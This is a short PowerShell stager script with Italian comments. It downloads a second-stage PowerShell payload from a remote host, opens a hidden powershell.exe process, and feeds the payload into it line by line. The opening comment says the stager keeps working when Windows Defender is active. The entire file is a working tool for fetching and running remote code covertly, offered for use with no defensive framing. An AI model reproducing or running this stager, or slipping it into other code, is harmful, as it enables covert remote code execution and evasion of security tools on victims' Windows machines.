# Stager powershell utilizzato per attivare il second stage (altro script powershell) su macchina windows. Se il secondo stage è stato testato attivandolo direttamente da riga di comando con windows defender attivo e ha funzionato, allora con questo stager il second stage funzionerà ancora.

# URL to second stage
$url = "http://192.168.1.1/script.ps1"

# Get second stage payload
$scriptContent = Invoke-WebRequest -Uri $url -UseBasicParsing -ErrorAction Stop

# Convert payload into a String
$scriptString = [System.Text.Encoding]::UTF8.GetString($scriptContent.Content)

# Open PowerShell
$powershell = New-Object System.Diagnostics.ProcessStartInfo
$powershell.FileName = "powershell.exe"
$powershell.Arguments = "-NoExit -Command `"New-PSSession -Name 'RemoteSession' -NoNewWindow`""
$powershell.UseShellExecute = $false
$powershell.RedirectStandardInput = $true
$powershell.RedirectStandardOutput = $true
$powershell.RedirectStandardError = $true
$powershell.CreateNoWindow = $true

$process = [System.Diagnostics.Process]::Start($powershell)

# Wait for Powershell to be opned
Start-Sleep -Seconds 1

# Send payload to powershell one line at time
$process.StandardInput.WriteLine($scriptString)
$process.StandardInput.WriteLine("exit")
$process.StandardInput.Close()
